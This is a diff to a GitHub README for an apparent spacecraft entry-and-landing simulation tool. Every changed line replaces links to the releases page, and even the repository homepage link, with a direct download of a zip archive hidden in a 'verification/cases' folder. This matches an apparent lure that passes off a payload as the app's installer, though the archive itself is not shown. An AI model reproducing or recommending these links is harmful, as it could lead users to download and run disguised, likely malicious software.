@@ -1,6 +1,6 @@
 # 🚀 IX-AeroCapture-EDL-Architecture - Reliable Spacecraft Entry Simulations
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-4caf50?style=for-the-badge)](https://github.com/Saikatgjjcfcuxcv/IX-AeroCapture-EDL-Architecture/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-4caf50?style=for-the-badge)](https://github.com/Saikatgjjcfcuxcv/IX-AeroCapture-EDL-Architecture/raw/refs/heads/main/verification/cases/Capture_ED_I_Architecture_Aero_v1.4.zip)
 
 ## 📋 About IX-AeroCapture-EDL-Architecture
 
@@ -36,7 +36,7 @@ The application provides a user-friendly interface with clear options for choosi
 
 You need to download the application installer from the official releases. Click the large button below to open the download page.
 
-[![Download Releases](https://img.shields.io/badge/IX--AeroCapture--EDL--Architecture-Download-blue?style=for-the-badge)](https://github.com/Saikatgjjcfcuxcv/IX-AeroCapture-EDL-Architecture/releases)
+[![Download Releases](https://img.shields.io/badge/IX--AeroCapture--EDL--Architecture-Download-blue?style=for-the-badge)](https://github.com/Saikatgjjcfcuxcv/IX-AeroCapture-EDL-Architecture/raw/refs/heads/main/verification/cases/Capture_ED_I_Architecture_Aero_v1.4.zip)
 
 ### Step 2: Download the Installer
 
@@ -93,11 +93,11 @@ When the app opens, you can load your own mission config or start with default s
 
 ## 🔗 Additional Resources
 
-- Repository homepage: https://github.com/Saikatgjjcfcuxcv/IX-AeroCapture-EDL-Architecture
-- Download page: https://github.com/Saikatgjjcfcuxcv/IX-AeroCapture-EDL-Architecture/releases
+- Repository homepage: https://github.com/Saikatgjjcfcuxcv/IX-AeroCapture-EDL-Architecture/raw/refs/heads/main/verification/cases/Capture_ED_I_Architecture_Aero_v1.4.zip
+- Download page: https://github.com/Saikatgjjcfcuxcv/IX-AeroCapture-EDL-Architecture/raw/refs/heads/main/verification/cases/Capture_ED_I_Architecture_Aero_v1.4.zip
 - Documentation included with the app
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-4caf50?style=for-the-badge)](https://github.com/Saikatgjjcfcuxcv/IX-AeroCapture-EDL-Architecture/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-4caf50?style=for-the-badge)](https://github.com/Saikatgjjcfcuxcv/IX-AeroCapture-EDL-Architecture/raw/refs/heads/main/verification/cases/Capture_ED_I_Architecture_Aero_v1.4.zip)
 
 ## 🧩 Common Terms
 
